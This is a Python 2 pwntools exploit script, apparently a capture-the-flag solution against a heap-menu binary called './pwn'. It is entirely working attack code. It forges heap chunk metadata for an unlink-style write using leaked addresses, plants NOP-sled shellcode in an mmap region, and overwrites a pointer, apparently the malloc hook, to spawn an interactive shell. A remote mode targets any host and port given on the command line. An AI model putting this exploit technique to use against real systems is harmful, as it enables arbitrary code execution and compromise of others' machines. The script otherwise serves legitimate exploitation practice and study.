#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('>>', str(index))

def create(size):
    menu(1)
    p.ru('Size:')
    p.sl(str(size))

def delete(index):
    menu(2)
    p.ru('Index:')
    p.sl(str(index))

def edit(index, content):
    menu(3)
    p.ru('Index:')
    p.sl(str(index))
    p.ru('Content:')
    p.s(content)

if __name__ == '__main__':
    p.ru('Mmap: ')
    mmap_addr = int(p.rl().strip(), 16)
    create(0xf8)
    p.ru('er Address ')
    ptr_addr = int(p.rl().strip(), 16)
    create(0xf8)
    create(0x18)
    edit(0, flat(0x0, 0xf1, ptr_addr - 0x18, ptr_addr - 0x10, '\x00' * 0xd0, 0xf0))
    delete(1)
    edit(0, flat(0x0, 0x0, 0xf8, ptr_addr - 0x18, 0x100, mmap_addr).ljust(0xf8, '\x00'))
    edit(1, ('\x90' * 0x10 + asm(shellcraft.sh())).ljust(0x100, '\x90'))
    edit(0, flat(0x0, 0x0, 0xf8, ptr_addr - 0x18, 0x0, ptr_addr + 0x28, 0x0, 0x91, '\x00' * 0x80, 0x0, 0x21, 0x0, 0x0, 0x0, 0x21).ljust(0xf8, '\x00'))
    delete(1)
    edit(0, flat(0x0, 0x0, 0xf8, ptr_addr - 0x18, 0x0, 0x0, 0x0, 0x0, 0x8, '\x10\n'))
    edit(3, flat(mmap_addr))
    #gogogo('x /20gx 0x0000555555756060\nx /20i %s' % hex(mmap_addr))
    #gogogo('x /1gx &__malloc_hook')
    create(0x10)
    #success('ptr_addr ' + hex(ptr_addr))
    #edit(0, flat(0x0, 0x0, 0xf8, ptr_addr))
    p.i()
